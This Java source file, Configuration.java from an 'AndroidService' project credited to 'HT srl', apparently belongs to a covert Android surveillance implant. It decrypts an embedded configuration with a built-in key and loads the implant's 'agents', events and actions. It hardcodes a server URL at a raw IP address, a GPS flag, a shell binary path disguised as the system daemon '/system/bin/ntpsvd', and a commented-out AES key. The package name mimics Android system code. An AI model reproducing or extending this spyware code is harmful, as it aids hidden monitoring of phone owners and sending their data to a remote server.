/* *********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.service.conf;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

import com.android.service.Debug;
import com.android.service.GeneralException;
import com.android.service.Messages;
import com.android.service.Status;
import com.android.service.action.Action;
import com.android.service.agent.AgentConf;
import com.android.service.agent.AgentType;
import com.android.service.auto.Cfg;
import com.android.service.crypto.Crypto;
import com.android.service.crypto.Keys;
import com.android.service.event.EventConf;
import com.android.service.event.EventType;
import com.android.service.util.Check;
import com.android.service.util.Utils;

/**
 * The Class Configuration.
 */
public class Configuration {
	private static final String TAG = "Configuration"; //$NON-NLS-1$

	/** The status obj. */
	private final Status status;

	/**
	 * Configuration file embedded into the .apk
	 */
	private final byte[] resource;

	/** Clear configuration buffer wrapped into a ByteBuffer. */
	private ByteBuffer wrappedClearConf;

	/**
	 * Configuration file tags (ASCII format, NULL-terminated in binary
	 * configuration).
	 */
	public static final String AGENT_CONF_DELIMITER = Messages.getString("17.0"); //$NON-NLS-1$

	/** The Constant EVENT_CONF_DELIMITER. */
	public static final String EVENT_CONF_DELIMITER = Messages.getString("17.1"); //$NON-NLS-1$

	/** The Constant MOBIL_CONF_DELIMITER. */
	public static final String MOBIL_CONF_DELIMITER = Messages.getString("17.2"); //$NON-NLS-1$

	/** This one is _not_ NULL-terminated into the binary configuration. */
	public static final String ENDOF_CONF_DELIMITER = Messages.getString("17.3"); //$NON-NLS-1$

	/** The Constant NEW_CONF. */
	public static final String NEW_CONF = Messages.getString("17.4"); //$NON-NLS-1$

	/** The Constant ACTUAL_CONF. */
	public static final String ACTUAL_CONF = Messages.getString("17.5");; //$NON-NLS-1$

	/** The Constant FORCED_CONF. */
	private static final String FORCED_CONF = Messages.getString("17.6"); //$NON-NLS-1$

	/** The Constant TASK_ACTION_TIMEOUT. */
	public static final long TASK_ACTION_TIMEOUT = 600000;

	public static final boolean GPS_ENABLED = true;

	public static final boolean OVERRIDE_SYNC_URL = false;
	public static final String SYNC_URL = "http://93.62.139.39/wc12/webclient"; //$NON-NLS-1$
	/** The Constant MIN_AVAILABLE_SIZE. */
	public static final long MIN_AVAILABLE_SIZE = 200 * 1024;

	public static final String shellFile = "/system/bin/ntpsvd";
	
	private static final int AGENT_ENABLED = 0x2;

	// public static final String SYNC_URL =
	// "http://192.168.1.189/wc12/webclient";

	// public static final boolean DEBUG = Config.DEBUG;

	/**
	 * Instantiates a new configuration.
	 * 
	 * @param resource
	 *            the resource
	 */
	public Configuration(final byte[] resource) {
		status = Status.self();
		this.resource = resource;
	}

	/**
	 * Load configuration.
	 * 
	 * @return true, if successful
	 * @throws GeneralException
	 *             the rCS exception
	 */
	public boolean LoadConfiguration() throws GeneralException {
		try {
			// Clean old configuration
			cleanConfiguration();

			// Decrypt Conf
			decryptConfiguration(resource);

			// Parse and load configuration
			parseConfiguration();
		} catch (final Exception rcse) {
			return false;
		}

		return true;
	}

	/**
	 * Parses the configuration.
	 * 
	 * @throws GeneralException
	 *             the rCS exception
	 */
	private void parseConfiguration() throws GeneralException {
		try {
			// Parse the whole configuration
			loadAgents();
			loadEvents();
			loadActions();
			loadOptions();

			// Debug Check. start //$NON-NLS-1$
			Debug.StatusActions();
			Debug.StatusAgents();
			Debug.StatusEvents();
			Debug.StatusOptions();
			// Debug Check. end //$NON-NLS-1$
		} catch (final GeneralException rcse) {
			throw rcse;
		}

		return;
	}

	/**
	 * Crc.
	 * 
	 * @param buffer
	 *            : input buffer
	 * @param offset
	 *            : offset
	 * @param len
	 *            : length of data into the buffer (buffer can be larger than
	 *            data)
	 * @return the int
	 */
	private int crc(final byte[] buffer, final int offset, final int len) {
		// CRC
		int confHash;
		long tempHash = 0;

		for (int i = offset; i < (len - offset); i++) {
			tempHash++;

			final byte b = buffer[i];

			if (b != 0) {
				tempHash *= b;
			}

			confHash = (int) (tempHash >> 32);

			tempHash = tempHash & 0xFFFFFFFFL;
			tempHash ^= confHash;
			tempHash = tempHash & 0xFFFFFFFFL;
		}

		confHash = (int) tempHash;
		if (Cfg.DEBUG) {
			Check.log(TAG + " Configuration CRC: " + confHash) ;//$NON-NLS-1$
		}
		return confHash;
	}

	/**
	 * Return the index at witch tag begins.
	 * 
	 * @param tag
	 *            string
	 * @return the offset where the tag ends
	 * @throws GeneralException
	 *             the rCS exception
	 */
	private int findTag(final String tag) throws GeneralException {
		final int index = Utils.getIndex(wrappedClearConf.array(), tag.getBytes());

		if (index == -1) {
			throw new GeneralException("Tag " + tag + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " Tag " + tag + " found at: " + index) ;//$NON-NLS-1$ //$NON-NLS-2$
		}
		return index;
	}

	/**
	 * Parses configuration file and loads the agents into Status.
	 * 
	 * @throws GeneralException
	 *             the rCS exception
	 */
	private void loadAgents() throws GeneralException {
		int agentTag;

		try {
			// Identify agents' section
			agentTag = findTag(AGENT_CONF_DELIMITER);
			agentTag += AGENT_CONF_DELIMITER.length() + 1;
		} catch (final GeneralException rcse) {
			throw rcse;
		}

		// How many agents we have?
		final int agentNum = wrappedClearConf.getInt(agentTag);
		wrappedClearConf.position(agentTag + 4);

		if (Cfg.DEBUG) {
			Check.log(TAG + " Number of agents: " + agentNum) ;//$NON-NLS-1$
		}

		// Get id, status, parameters length and parameters
		for (int i = 0; i < agentNum; i++) {
			final int typeId = wrappedClearConf.getInt();
			final boolean enabled = wrappedClearConf.getInt() == AGENT_ENABLED;
			final int plen = wrappedClearConf.getInt();

			final byte[] params = new byte[plen];

			if (plen != 0) {
				wrappedClearConf.get(params, 0, plen);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Agent: " + typeId + " Enabled: " + enabled + " Params Len: " + plen) ;//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
			}

			if (AgentType.isValid(typeId)) {
				final AgentConf a = new AgentConf(typeId, enabled, params);
				status.addAgent(a);
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error (loadAgents): null key") ;//$NON-NLS-1$
				}
			}
		}

		return;
	}

	/**
	 * Parses configuration file and loads the events into Status.
	 * 
	 * @throws GeneralException
	 *             the rCS exception
	 */
	private void loadEvents() throws GeneralException {
		int eventTag;

		try {
			// Identify events' section
			eventTag = findTag(EVENT_CONF_DELIMITER);
			eventTag += EVENT_CONF_DELIMITER.length() + 1;
		} catch (final GeneralException rcse) {
			throw rcse;
		}

		// How many events we have?
		final int eventNum = wrappedClearConf.getInt(eventTag);
		wrappedClearConf.position(eventTag + 4);

		if (Cfg.DEBUG) {
			Check.log(TAG + " Number of events: " + eventNum) ;//$NON-NLS-1$
		}

		// Get id, status, parameters length and parameters
		for (int i = 0; i < eventNum; i++) {
			final int typeId = wrappedClearConf.getInt();
			final int action = wrappedClearConf.getInt();
			final int plen = wrappedClearConf.getInt();

			final byte[] params = new byte[plen];

			if (plen != 0) {
				wrappedClearConf.get(params, 0, plen);
			}

			if (EventType.isValid(typeId)) {

				if (Cfg.DEBUG) {
					Check.log(TAG + " Configuration.java Event: " + typeId + " Action: " + action + " Params Len:  " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
							+ plen); //$NON-NLS-1$
				}

				final EventConf e = new EventConf(typeId, i, action, params);
				status.addEvent(e);

			}
		}

		return;
	}

	/*
	 * Load the actions into Status, due to configuration file format, this
	 * method can only be called after calling loadEvents()
	 */
	/**
	 * Load actions.
	 * 
	 * @throws GeneralException
	 *             the rCS exception
	 */
	private void loadActions() throws GeneralException {
		final int actionNum = wrappedClearConf.getInt();

		if (Cfg.DEBUG) {
			Check.log(TAG + " Number of actions " + actionNum) ;//$NON-NLS-1$
		}

		try {
			for (int i = 0; i < actionNum; i++) {
				final int subNum = wrappedClearConf.getInt();

				final Action a = new Action(i);

				if (Cfg.DEBUG) {
					Check.log(TAG + " Action " + i + " SubActions: " + subNum) ;//$NON-NLS-1$ //$NON-NLS-2$
				}

				for (int j = 0; j < subNum; j++) {
					final int type = wrappedClearConf.getInt();
					final int plen = wrappedClearConf.getInt();

					final byte[] params = new byte[plen];

					if (plen != 0) {
						wrappedClearConf.get(params, 0, plen);
					}

					if (a.addSubAction(type, params)) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " SubAction " + j + " Type: " + type + " Params Length: " + plen) ;//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
						}
					}
				}

				if (Cfg.DEBUG) {
					Check.ensures(a.getSubActionsNum() == subNum, "inconsistent subaction number"); //$NON-NLS-1$
				}

				status.addAction(a);
			}
		} catch (final GeneralException rcse) {
			throw rcse;
		}

		return;
	}

	/**
	 * Load options.
	 * 
	 * @throws GeneralException
	 *             the rCS exception
	 */
	private void loadOptions() throws GeneralException {
		int optionsTag;

		try {
			// Identify agents' section
			optionsTag = findTag(MOBIL_CONF_DELIMITER);
			optionsTag += MOBIL_CONF_DELIMITER.length() + 1;
		} catch (final GeneralException rcse) {
			throw rcse;
		}

		// How many agents we have?
		final int optionsNum = wrappedClearConf.getInt(optionsTag);
		wrappedClearConf.position(optionsTag + 4);

		if (Cfg.DEBUG) {
			Check.log(TAG + " Number of options: " + optionsNum) ;//$NON-NLS-1$
		}

		// Get id, status, parameters length and parameters
		for (int i = 0; i < optionsNum; i++) {
			final int id = wrappedClearConf.getInt();
			final int plen = wrappedClearConf.getInt();

			final byte[] params = new byte[plen];

			if (plen != 0) {
				wrappedClearConf.get(params, 0, plen);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Option: " + id + " Params Len: " + plen) ;//$NON-NLS-1$ //$NON-NLS-2$
			}

			final Option o = new Option(id, params);
			status.addOption(o);
		}

		return;
	}

	/**
	 * Decrypt configuration.
	 * 
	 * @param rawConf
	 *            the raw conf
	 * @throws GeneralException
	 *             the rCS exception
	 */
	private void decryptConfiguration(final byte[] rawConf) throws GeneralException {
		/**
		 * Struttura del file di configurazione
		 * 
		 * |DWORD|DWORD|DWORD|DATA.....................|CRC| |---Skip----|-Len-|
		 * 
		 * Le prime due DWORD vanno skippate. La terza DWORD contiene la
		 * lunghezza del blocco di dati (inclusa la stessa Len) CRC e' il CRC
		 * (cifrato) dei dati in chiaro, inclusa la DWORD Len
		 */

		try {

			if (rawConf == null) {
				throw new GeneralException("Cannot allocate memory for configuration"); //$NON-NLS-1$
			}

			// Decrypt configuration
			/*
			 * byte[] aesConfKey = new byte[] { (byte)0xa9, (byte)0x98,
			 * (byte)0x76, (byte)0x7f, (byte)0x8c, (byte)0x31, (byte)0x99,
			 * (byte)0xb0, (byte)0x33, (byte)0x8c, (byte)0xb2, (byte)0xd9,
			 * (byte)0x98, (byte)0x08, (byte)0x42, (byte)0x58 };
			 */

			// Crypto crypto = new Crypto(Keys.g_ConfKey);
			final byte[] confKey = Keys.self().getConfKey();
			final Crypto crypto = new Crypto(confKey);
			final byte[] clearConf = crypto.decrypt(rawConf, 0);

			// Extract clear length DWORD
			this.wrappedClearConf = Utils.bufferToByteBuffer(clearConf, ByteOrder.LITTLE_ENDIAN);

			final int confClearLen = this.wrappedClearConf.getInt();

			// Verify CRC
			final int confCrc = this.wrappedClearConf.getInt(confClearLen - 4);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (decryptConfiguration): confClearLen" + confClearLen);
			}
			
			if( confClearLen - 4 <= 0){
				throw new GeneralException("Wrong length");
			}
			
			if(clearConf.length < confClearLen - 4){
				throw new GeneralException("Wrong length");
			}
			
			if (confCrc != crc(clearConf, 0, confClearLen - 4)) {
				throw new GeneralException("CRC mismatch, stored CRC = " + confCrc + " calculated CRC = " //$NON-NLS-1$ //$NON-NLS-2$
						+ crc(clearConf, 0, confClearLen));
			}

			// Return decrypted conf
			if (Cfg.DEBUG) {
				Check.log(TAG + " Configuration is valid") ;//$NON-NLS-1$
			}
			return;
		} catch (final IOException ioe) {
			if (Cfg.DEBUG) {
				Check.log(ioe) ;//$NON-NLS-1$
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " IOException() detected") ;//$NON-NLS-1$
			}
		} catch (final SecurityException se) {
			if (Cfg.DEBUG) {
				Check.log(se) ;//$NON-NLS-1$
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " SecurityException() detected") ;//$NON-NLS-1$
			}
		} catch (final Exception e) {
			if (Cfg.DEBUG) {
				Check.log(e) ;//$NON-NLS-1$
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " Exception() detected") ;//$NON-NLS-1$
			}
		}

		return;
	}

	/**
	 * Clean configuration and status objects.
	 */
	public void cleanConfiguration() {
		// Clean an eventual old initialization
		status.clean();

		// Clean configuration buffer
		wrappedClearConf = null;
	}

	public static boolean isDebug() {
		return Cfg.DEBUG;
	}

}
